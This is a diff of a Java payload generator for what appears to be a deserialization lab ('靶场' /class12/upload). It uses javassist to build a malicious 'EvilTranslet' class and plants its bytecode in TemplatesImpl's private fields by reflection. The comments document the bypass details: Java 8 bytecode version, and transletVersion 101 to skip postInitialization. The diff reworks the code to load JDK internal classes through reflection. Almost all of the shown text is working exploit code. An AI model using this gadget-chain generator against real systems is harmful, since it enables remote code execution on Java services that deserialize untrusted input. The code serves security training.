@@ -1,13 +1,12 @@
 package class12;
 
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtNewConstructor;
 import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
+import com.ctfstu.common.Logger;
 
 /**
  * 生成 class12 的 payload — TemplatesImpl (javassist 字节码)
@@ -15,12 +14,13 @@ import java.lang.reflect.Field;
  * 靶场: /class12/upload
  *
  * 注意:
- * - 编译和运行需要 --add-exports/--add-opens（pom.xml 已配置）
+ * - 使用反射访问 com.sun.org.apache.xalan... 内部类，无需 --add-exports
  * - 字节码版本设为 52 (Java 8)，确保 JDK 8 靶场能加载
  * - transletVersion = 101 跳过 AbstractTranslet.postInitialization()
  */
 public class GenPayload {
     public static void main(String[] args) throws Exception {
+        Logger.setLogLevel(Logger.DEBUG);
         ClassPool pool = ClassPool.getDefault();
         CtClass ctClass = pool.makeClass("EvilTranslet");
         ctClass.setSuperclass(pool.get(
@@ -46,9 +46,18 @@ public class GenPayload {
 
         byte[] evilBytes = ctClass.toBytecode();
 
-        TemplatesImpl templates = new TemplatesImpl();
+        // 使用反射创建 TemplatesImpl / TransformerFactoryImpl，
+        // 避免直接导入 JDK 内部类导致的编译问题
+        Class<?> templatesClass = Class.forName(
+                "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
+        Class<?> tfClass = Class.forName(
+                "com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl");
+
+        Object templates = templatesClass.getDeclaredConstructor().newInstance();
+        Object tf = tfClass.getDeclaredConstructor().newInstance();
+
         setField(templates, "_bytecodes", new byte[][]{evilBytes});
-        setField(templates, "_tfactory", new TransformerFactoryImpl());
+        setField(templates, "_tfactory", tf);
         setField(templates, "_transletIndex", 0);
         setField(templates, "_name", "EvilTranslet");
 
